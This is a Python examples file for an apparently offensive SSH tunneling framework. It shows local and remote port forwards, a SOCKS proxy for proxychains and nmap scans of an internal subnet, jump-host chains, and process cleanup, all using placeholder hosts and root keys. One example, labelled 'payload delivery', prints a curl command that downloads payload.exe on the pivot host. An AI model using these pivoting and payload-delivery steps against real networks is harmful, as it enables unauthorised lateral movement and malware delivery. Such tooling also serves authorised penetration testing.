"""
Example Usage of SSH Tunneling Framework
Demonstrates programmatic usage of the framework
"""

from ..ssh_tunneling import (
    TunnelManager,
    LocalForwardTunnel,
    RemoteForwardTunnel,
    DynamicForwardTunnel,
    JumpHostTunnel
)
from ..ssh_tunneling.utils.process_manager import ProcessManager
import time


def example_local_forward():
    """Example: Local port forward to internal RDP server"""
    print("\n" + "=" * 60)
    print("EXAMPLE 1: Local Port Forward")
    print("=" * 60)

    # Initialize manager
    manager = TunnelManager(output_dir="example_tunnels")

    # Create local port forward
    tunnel = LocalForwardTunnel(
        pivot_host="10.0.0.1",
        pivot_user="root",
        pivot_key="/home/user/.ssh/id_rsa",
        target_host="192.168.1.100",
        target_port=3389,
        local_port=3389
    )

    # Establish tunnel
    if manager.add_tunnel(tunnel):
        print("\n[+] SUCCESS!")
        print("[*] Connect with: xfreerdp /v:localhost:3389")


def example_socks_proxy():
    """Example: SOCKS proxy for network scanning"""
    print("\n" + "=" * 60)
    print("EXAMPLE 2: SOCKS Proxy")
    print("=" * 60)

    manager = TunnelManager(output_dir="example_tunnels")

    # Create SOCKS proxy
    tunnel = DynamicForwardTunnel(
        pivot_host="10.0.0.1",
        pivot_user="root",
        pivot_key="/home/user/.ssh/id_rsa",
        socks_port=1080,
        output_dir=manager.get_output_dir()
    )

    if manager.add_tunnel(tunnel):
        print("\n[+] SUCCESS!")
        print("[*] Proxychains config: example_tunnels/proxychains.conf")
        print("[*] Usage: proxychains4 -f example_tunnels/proxychains.conf nmap -sT 192.168.1.0/24")

        # Optional: Test connectivity
        print("\n[*] Testing connectivity...")
        time.sleep(2)  # Wait for tunnel to establish
        tunnel.test_connectivity("http://192.168.1.1")


def example_remote_forward():
    """Example: Remote port forward for payload delivery"""
    print("\n" + "=" * 60)
    print("EXAMPLE 3: Remote Port Forward")
    print("=" * 60)

    manager = TunnelManager(output_dir="example_tunnels")

    # Create remote port forward
    tunnel = RemoteForwardTunnel(
        pivot_host="10.0.0.1",
        pivot_user="root",
        pivot_key="/home/user/.ssh/id_rsa",
        attacker_port=8080,  # Attacker's web server
        remote_port=80  # Port on pivot
    )

    if manager.add_tunnel(tunnel):
        print("\n[+] SUCCESS!")
        print("[*] On pivot: curl http://localhost:80/payload.exe -o payload.exe")


def example_jump_host():
    """Example: Jump host for multi-hop access"""
    print("\n" + "=" * 60)
    print("EXAMPLE 4: Jump Host")
    print("=" * 60)

    manager = TunnelManager(output_dir="example_tunnels")

    # Create jump host tunnel
    tunnel = JumpHostTunnel(
        jump_host="10.0.0.1",
        jump_user="root",
        jump_key="/home/user/.ssh/jump_key",
        target_host="192.168.2.100",
        target_user="admin",
        target_key="/home/user/.ssh/target_key",
        local_port=2222,
        target_port=22
    )

    if manager.add_tunnel(tunnel):
        print("\n[+] SUCCESS!")
        print("[*] Connect with: ssh -p 2222 admin@localhost")


def example_multiple_tunnels():
    """Example: Multiple simultaneous tunnels"""
    print("\n" + "=" * 60)
    print("EXAMPLE 5: Multiple Tunnels")
    print("=" * 60)

    manager = TunnelManager(output_dir="example_tunnels")

    # RDP tunnel
    rdp_tunnel = LocalForwardTunnel(
        pivot_host="10.0.0.1",
        pivot_user="root",
        pivot_key="/home/user/.ssh/id_rsa",
        target_host="192.168.1.100",
        target_port=3389,
        local_port=3389
    )

    # SMB tunnel
    smb_tunnel = LocalForwardTunnel(
        pivot_host="10.0.0.1",
        pivot_user="root",
        pivot_key="/home/user/.ssh/id_rsa",
        target_host="192.168.1.100",
        target_port=445,
        local_port=4445
    )

    # SOCKS proxy
    socks_tunnel = DynamicForwardTunnel(
        pivot_host="10.0.0.1",
        pivot_user="root",
        pivot_key="/home/user/.ssh/id_rsa",
        socks_port=1080,
        output_dir=manager.get_output_dir()
    )

    # Establish all tunnels
    manager.add_tunnel(rdp_tunnel)
    manager.add_tunnel(smb_tunnel)
    manager.add_tunnel(socks_tunnel)

    # List all active tunnels
    print("\n")
    manager.list_active_tunnels()


def example_process_management():
    """Example: Process management utilities"""
    print("\n" + "=" * 60)
    print("EXAMPLE 6: Process Management")
    print("=" * 60)

    # List all SSH tunnel processes
    print("\n[*] Listing SSH tunnel processes...")
    ProcessManager.list_processes()

    # Check if port is in use
    port = 1080
    if ProcessManager.check_port_in_use(port):
        print(f"\n[!] Port {port} is in use")
        info = ProcessManager.get_port_info(port)
        print(f"[*] Port info: {info}")
    else:
        print(f"\n[+] Port {port} is available")


def example_cleanup():
    """Example: Clean up all tunnels"""
    print("\n" + "=" * 60)
    print("EXAMPLE 7: Cleanup")
    print("=" * 60)

    # Kill all SSH tunnels
    killed = ProcessManager.kill_all_tunnels()

    print(f"\n[+] Cleanup complete. Killed {killed} tunnel(s)")


def main():
    """Run all examples"""
    print("""
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║       SSH Tunneling Framework - Usage Examples               ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝

IMPORTANT: These examples use placeholder credentials and hosts.
Replace with your actual values for real operations.

Examples:
1. Local Port Forward - Access internal RDP
2. SOCKS Proxy - Network scanning through pivot
3. Remote Port Forward - Payload delivery
4. Jump Host - Multi-hop access
5. Multiple Tunnels - Simultaneous connections
6. Process Management - Monitor and control
7. Cleanup - Kill all tunnels
    """)

    # NOTE: In real usage, uncomment the examples you want to run
    # and replace the placeholder values with real credentials

    # example_local_forward()
    # example_socks_proxy()
    # example_remote_forward()
    # example_jump_host()
    # example_multiple_tunnels()
    # example_process_management()
    # example_cleanup()

    print("\n[*] Examples defined but not executed (see comments in code)")
    print("[*] Uncomment examples and add real credentials to run")


if __name__ == "__main__":
    main()